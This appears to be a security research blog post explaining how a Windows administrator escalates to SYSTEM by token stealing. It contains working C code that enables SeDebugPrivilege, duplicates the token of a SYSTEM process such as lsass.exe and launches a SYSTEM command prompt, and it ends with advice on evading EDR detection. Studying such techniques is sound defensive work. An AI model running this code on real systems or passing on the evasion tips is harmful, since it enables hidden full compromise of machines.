---
layout: single
classes: wide
title:  "Admin to SYSTEM via Token Stealing"
date:   2024-5-27 12:01:57 +0100
---

For this research project I wanted to figure out how I could get from Administrator to SYSTEM. Although being apart of the Administrators group grants you a lot of privileges, there are still some things that Windows prevents you from doing. A good example is trying to view HKLM\SAM or HKLM\SECURITY via Registry Editor.

![Administrator Registry View](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/normalRegistryEditorView.png)

The Windows Internals Part 2 7th Edition book gives a great explanation of what the SYSTEM account is, “The local system account is the same account in which core Windows user-mode operating system components run…” Viewing the same registry keys as SYSTEM however does show the subkeys and their values.

![SYSTEM Registry View](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/systemRegistryEditorView.png)

Starting to research on how to go from an Administrator-level user to SYSTEM, I came across 2 key issues. The first is that there is no “convenient” way to get from Administrator to SYSTEM that I could find. The second is a specific privilege is required in order to get from Administrator to SYSTEM that is disabled by default, even from an Administrator context.

### The Steps From Admin to SYSTEM
In order to get from an Admin context to SYSTEM, the token of a process running as SYSTEM has to be obtained. In order to open a HANDLE to a process running as SYSTEM, the SeDebugPrivilege has to be enabled because the default security descriptor of an Administrator does not allow a HANDLE to be opened of a SYSTEM process. From [MSDN documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) “If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor”. *This however does not work with protected processes*.

![Access Denied to Handle to Lsass](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/errorOpeningHandleToLsass.png)

## Enabling SeDebugPrivilege
The Administrator user does have the ability to adjust the token of a low-level user process and modify it to enable the SeDebugPrivilege by using legitimate Win32 functions such as [AdjustTokenPrivileges](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges). I created a simple program that will enable any privilege of a process ID when being run from an Administrator’s context.

```c
TOKEN_PRIVILEGES privs;
LUID luid;

ZeroMemory(&privs, sizeof(privs));
ZeroMemory(&luid, sizeof(luid));

returnValue = LookupPrivilegeValueA(NULL, argv[1], &luid);

if (returnValue == 0) {
	printf("[-] Failed to lookup privilege for %s with error %d\n", argv[1], GetLastError());
	return 4;
}

printf("[+] Found LUID for %s\n", argv[1]);

privs.PrivilegeCount = 1;
privs.Privileges[0].Luid = luid;

privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

returnValue = AdjustTokenPrivileges(tokenHandle, FALSE, &privs, sizeof(PTOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

if (returnValue == 0) {
	printf("[-] Failed to adjust token privileges for PID %d with error %d\n", pid, GetLastError());
	return 6;
}

if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
	printf("[-] The token does not have one or more of the privileges specified in the NewState parameter\n");
	return 7;
}
```

It will search the [LUID](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid) of a given privilege string name and set that privilege to be enabled on the specified token. Since SeDebugPrivilege is required for this project, I enabled that privilege.

![Enabling SeDebugPrivilege](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/enablingSeDebugPrivilege.png)

Once SeDebugPrivilege is enabled, it is as simple as opening a HANDLE to a process running as SYSTEM, copying their primary token, and creating a new process using CreateProcessWithTokenW.

## What is a Token?

Microsoft [defines tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens) as “an object that describes the security context of a process or thread. The information in a token includes the identity and privileges of the user account associated with the process or thread.” There are a lot of various components a token contains, but the fields that we are most interested in for this case are
* A list of the privileges held by either the user or the user’s groups
* The default DACL that the system uses when the user creates a securable object without specifying a security descriptor
* Current impersonation levels

The below image is the primary token dump of an Administrator command prompt with SeDebugPrivilege enabled.

![Administrator CMD Token Dump](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/administratorCmdTokenDump.png)

It shows various groups and privileges that are assigned to the process. The value types in the TOKEN structure for processes are listed below

```c
+0x000 TokenSource      : _TOKEN_SOURCE
+0x010 TokenId          : _LUID
+0x018 AuthenticationId : _LUID
+0x020 ParentTokenId    : _LUID
+0x028 ExpirationTime   : _LARGE_INTEGER
+0x030 TokenLock        : Ptr64 _ERESOURCE
+0x038 ModifiedId       : _LUID
+0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
+0x058 AuditPolicy      : _SEP_AUDIT_POLICY
+0x078 SessionId        : Uint4B
+0x07c UserAndGroupCount : Uint4B
+0x080 RestrictedSidCount : Uint4B
+0x084 VariableLength   : Uint4B
+0x088 DynamicCharged   : Uint4B
+0x08c DynamicAvailable : Uint4B
+0x090 DefaultOwnerIndex : Uint4B
+0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES
+0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES
+0x0a8 PrimaryGroup     : Ptr64 Void
+0x0b0 DynamicPart      : Ptr64 Uint4B
+0x0b8 DefaultDacl      : Ptr64 _ACL
+0x0c0 TokenType        : _TOKEN_TYPE
+0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
+0x0c8 TokenFlags       : Uint4B
+0x0cc TokenInUse       : UChar
+0x0d0 IntegrityLevelIndex : Uint4B
+0x0d4 MandatoryPolicy  : Uint4B
+0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
+0x0e0 OriginatingLogonSession : _LUID
+0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
+0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
+0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
+0x310 Package          : Ptr64 Void
+0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES
+0x320 CapabilityCount  : Uint4B
+0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
+0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY
+0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
+0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
+0x450 TrustLevelSid    : Ptr64 Void
+0x458 TrustLinkedToken : Ptr64 _TOKEN
+0x460 IntegrityLevelSidValue : Ptr64 Void
+0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK
+0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY
+0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY
+0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
+0x488 SessionObject    : Ptr64 Void
+0x490 VariablePart     : Uint8B
```

### Primary vs Impersonation Tokens

A primary token is tied to the security context of the user account associated with the process. An impersonation token is can be used to change the security context of a thread to a different user. DuplicateTokenEx can be used in order to convert between the two if need be. A good example of where this is used is a server application that impersonates the security context of clients that connect to the server to perform some type of operation.

When attempting to use DuplicateToken instead of DuplicateTokenEx, an access denied error (5) is given when attempting to create a new process with the duplicated token. This is because DuplicateToken only produces impersonation tokens and in order to create a new process using CreateProcessWithTokenW, it requires a primary token. A primary token can be duplicated using DuplicatTokenEx by specifying the TokenType parameter to a [TOKEN_TYPE](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type) variable and setting it to TokenPrimary.

Below is the a primary token for a command prompt running as SYSTEM.

![SYSTEM CMD Token Dump](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/systemCmdTokenDump.png)

Two immediate changes that jump out is the primary group of the associated process and the enabled default privileges. The SID is S-1-5-18 which is the SID for the System (or LocalSystem). From Microsoft’s documentation, “System is a hidden member of Administrators. That is, any process running as System has the SID for the built-in Administrators group in its access token.” This is the case in my system as the S-1-5-32-544 is the Administrators group.

The following user groups are associated with each SID

| SID | Group Name |
| --- | --- |
| S-1-5-32-544 | Administrators |
| S-1-1-0 | AUTHENTICATED_USERS |
| S-1-16-16384 | ML_SYSTEM |
| S-1-5-18 | LOCAL_SYSTEM |

The TOKEN structure for the SYSTEM account is listed below


```c
+0x000 TokenSource      : _TOKEN_SOURCE
+0x010 TokenId          : _LUID
+0x018 AuthenticationId : _LUID
+0x020 ParentTokenId    : _LUID
+0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
+0x030 TokenLock        : 0xffffa285`151d8810 _ERESOURCE
+0x038 ModifiedId       : _LUID
+0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
+0x058 AuditPolicy      : _SEP_AUDIT_POLICY
+0x078 SessionId        : 1
+0x07c UserAndGroupCount : 5
+0x080 RestrictedSidCount : 0
+0x084 VariableLength   : 0xa4
+0x088 DynamicCharged   : 0x1000
+0x08c DynamicAvailable : 0
+0x090 DefaultOwnerIndex : 1
+0x098 UserAndGroups    : 0xffffc681`ccc1aa80 _SID_AND_ATTRIBUTES
+0x0a0 RestrictedSids   : (null) 
+0x0a8 PrimaryGroup     : 0xffffc681`bde5d0e0 Void
+0x0b0 DynamicPart      : 0xffffc681`bde5d0e0  -> 0x101
+0x0b8 DefaultDacl      : 0xffffc681`bde5d0ec _ACL
+0x0c0 TokenType        : 1 ( TokenPrimary )
+0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
+0x0c8 TokenFlags       : 0x2000
+0x0cc TokenInUse       : 0x1 ''
+0x0d0 IntegrityLevelIndex : 4
+0x0d4 MandatoryPolicy  : 1
+0x0d8 LogonSession     : 0xffffc681`b5a3ae50 _SEP_LOGON_SESSION_REFERENCES
+0x0e0 OriginatingLogonSession : _LUID
+0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
+0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
+0x308 pSecurityAttributes : 0xffffc681`c7146e10 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
+0x310 Package          : (null) 
+0x318 Capabilities     : (null) 
+0x320 CapabilityCount  : 0
+0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
+0x438 LowboxNumberEntry : (null) 
+0x440 LowboxHandlesEntry : (null) 
+0x448 pClaimAttributes : (null) 
+0x450 TrustLevelSid    : (null) 
+0x458 TrustLinkedToken : (null) 
+0x460 IntegrityLevelSidValue : (null) 
+0x468 TokenSidValues   : (null) 
+0x470 IndexEntry       : 0xffffc681`cdb97bd0 _SEP_LUID_TO_INDEX_MAP_ENTRY
+0x478 DiagnosticInfo   : (null) 
+0x480 BnoIsolationHandlesEntry : (null) 
+0x488 SessionObject    : 0xffffa285`0c9f1200 Void
+0x490 VariablePart     : 0xffffc681`ccc1aad0
```

A key aspect to note is the ImpersonationLevel field (+0x0c4). According to [Microsoft’s documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels), “most of the thread’s actions occur in the security context of the thread’s impersonation token rather than in the primary token of the process that owns the thread.” There are some circumstances where the primary token is used over the impersonation token.

One key point that isn’t mentioned in MSDN documentation that I could find is that if a thread doesn’t have a specific impersonation token set, the thread’s token context will fall back to the primary token of the process. I set the current context to be the primary thread of the SYTEM command prompt process and attempted to see the token value of it.

![Impersonation Token Fallback](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/impersonationTokenFallback.png)

Since it doesn’t have an impersonation token set, it will use the process’s token instead. It is possible to create our own token from scratch by calling the ntdll function ZwCreateToken but that is out of scope for this post. For more information on using ZwCreateToken, I recommend reading [this post](https://decoder.cloud/2019/07/04/creating-windows-access-tokens/).

## Process as SYSTEM
What is normally used to create a process with the Win32 API is CreateProcess, this however cannot be used because a token cannot be specified with it. However, [CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) does allow a primary (not impersonation) token to be specified to create a new process.

```c
BOOL returnValue = OpenProcessToken(systemProcess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &token);
if (returnValue == 0) {
	printf("[-] Error opening handle to SYSTEM process: %d\n", GetLastError());
	return 3;
}
printf("[+] Token to SYSTEM process obtained %p\n", token);

HANDLE systemToken;
ZeroMemory(&systemToken, sizeof(systemToken));

SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
TOKEN_TYPE tokenType = TokenPrimary;

returnValue = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &systemToken);
if (returnValue == 0) { 
	printf("[-] Error in duplicating token of SYSTEM process %d\n", GetLastError());
	return 4;
}
printf("[+] Success in duplicate process running as SYSTEM %p\n", systemToken);

STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
ZeroMemory(&pi, sizeof(pi));

returnValue = CreateProcessWithTokenW(systemToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, L"C:\\Windows\\System32", &si, &pi);
if (returnValue == 0) {
	printf("[-] Error in creating process as SYSTEM user %d\n", GetLastError());
	return 5;
}
```

Executing this program creates a new console that is running in the context of the SYSTEM user.

![SYSTEM CMD](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/systemCMD.png)

I chose to copy the primary token of the lsass.exe process (PID of 1292 in this case). This activity, however, is usually signatured and monitored by EDRs because opening a HANDLE to the targeted process is required. Any process that is running as SYSTEM can be used to generate the same SYSTEM command prompt. As mentioned earlier, protected processes such as csrss.exe, wininit.exe, and some svchosts.exe processes will generate an error ID code of [5 which is ERROR_ACCESS_DENIED](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-).

![Access Denied to Protected Process](/assets/img/Admin-to-SYSTEM-via-Token-Stealing/protectedProcessAccessDenied.png)

This error occurs even when SeDebugPrivilege is enabled because according to Microsoft's documentation, "If the specified process is the System Idle Process (0x00000000), the function fails and the last error code is ERROR_INVALID_PARAMETER. If the specified process is the System process or one of the Client Server Run-Time Subsystem (CSRSS) processes, this function fails and the last error code is ERROR_ACCESS_DENIED because their access restrictions prevent user-level code from opening them."

## Key Takeaway
It is important to remember if covertness is key when going from Admin to SYSTEM via token stealing, don’t open HANDLES to processes that are heavily monitored by EDRs such as Lsass. Usually the calling process is instantly killed or an alert is generated and that could lead to your activity being detected. Opening a HANDLE to a SYSTEM process that isn’t as heavily monitored or indicative of malicious activity will decrease the likelihood of your activity being detected.